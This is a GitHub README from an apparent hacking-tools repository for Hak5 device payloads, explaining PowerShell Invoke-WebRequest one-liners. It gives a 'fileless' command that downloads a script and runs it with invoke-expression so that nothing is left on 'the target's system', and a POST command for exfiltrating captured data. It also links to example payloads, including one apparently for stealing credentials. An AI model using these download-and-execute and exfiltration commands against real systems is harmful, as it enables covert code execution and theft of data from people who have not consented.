![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)

<!-- TABLE OF CONTENTS -->
<details>
  <summary>Table of Contents</summary>
  <ol>
    <li><a href="#Description">Description</a></li>
    <li><a href="#The-Function">The Function</a></li>
    <li><a href="#Examples">Examples</a></li>
    <li><a href="#Contact">Contact</a></li>
    <li><a href="#Acknowledgments">Acknowledgments</a></li>
  </ol>
</details>

Appreciate [UberGuidoZ](https://github.com/UberGuidoZ) for contributing to this function.

# Invoke-WebRequest

<p align="center">
      <a href="https://www.youtube.com/watch?v=bPkBzyEnr-w">
        <img src=https://i.ytimg.com/vi/bPkBzyEnr-w/hqdefault.jpg width="300" alt="Python" />
      </a>
      <br>YouTube Tutorial	
</p>

## Description

These functions are used to either download or upload files or data

## The Function

### [IWR-Save] 

This formatting of the IWR function will download a file from a selected URL and save it to the directory of your choosing 

This is helpful if you are trying to save an image or sound file to use in your script

------------------------------------------------------------------------------------------------------------------------------

$env:TMP\   

Use this environment variable to save the file to your Temp directory

$Env:USERPROFILE\Desktop\    

Use this environment variable to save a file to your desktop

```
iwr < Your url for the intended file>?dl=1 -O $Env:USERPROFILE\Desktop\image.jpg
```

### [IWR-Fileless] 

This formatting of the IWR function will download a file and execute it immedietely without saving it to memory

This is helpful if you are trying to download and execute a script without keeping it on the target's system

```
$pl = iwr < Your url for the intended file>?dl=1; invoke-expression $pl
```

### [IWR-Post] 

This formatting of the IWR function will exfiltrate data via a DNS/POST

This is helpful if you are trying to exfiltrate the data you have captured

[Request Catcher](https://requestcatcher.com/)<-------Helpful website to test POST requests

```
iwr -Uri < Your url for posting the intended data> -Method POST -Body "text to upload"
```

<p align="right">(<a href="#top">back to top</a>)</p>


## Examples 

Listed below are payloads that have used one of these functions:

[Acid Burn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-AcidBurn)

[JumpScare](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-JumpScare)

[WallPaper-Troll](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Wallpaper-Troll)

[Credz-Plz](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Credz-Plz)

<p align="right">(<a href="#top">back to top</a>)</p>

<!-- CONTACT -->
## Contact

<h2 align="center">📱 My Socials 📱</h2>
<div align=center>
<table>
  <tr>
    <td align="center" width="96">
      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
      </a>
      <br>YouTube
    </td>
    <td align="center" width="96">
      <a href="https://twitter.com/I_Am_Jakoby">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
      </a>
      <br>Twitter
    </td>
    <td align="center" width="96">
      <a href="https://www.instagram.com/i_am_jakoby/">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
      </a>
      <br>Instagram
    </td>
    <td align="center" width="96">
      <a href="https://discord.gg/MYYER2ZcJF">
        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
      </a>
      <br>Discord
    </td>
  </tr>
</table>
</div>



<p align="right">(<a href="#top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

* [Hak5](https://hak5.org/)
* [UberGuidoZ](https://github.com/UberGuidoZ)

***

[HOME-PAGE](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers)

<p align="right">(<a href="#top">back to top</a>)</p>
